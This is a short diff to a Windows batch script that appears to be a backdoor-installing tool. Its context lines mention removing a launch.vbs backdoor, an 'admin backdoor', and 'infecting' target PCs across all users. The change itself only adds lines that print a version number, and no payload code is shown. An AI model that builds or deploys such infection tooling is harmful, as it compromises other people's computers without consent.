@@ -36,6 +36,8 @@ if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
 if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
 :no_remove_backdoor
 :: manual configuration
+  echo current version: %update_number%
+  echo.
   echo [31madmin backdoor is currently broken, do no use this[0m
   echo do you have admin permissions on the target PC?
   echo note: this will require you to have admin rights when infecting A PC, however it will infect all users on that PC, not just the active one.
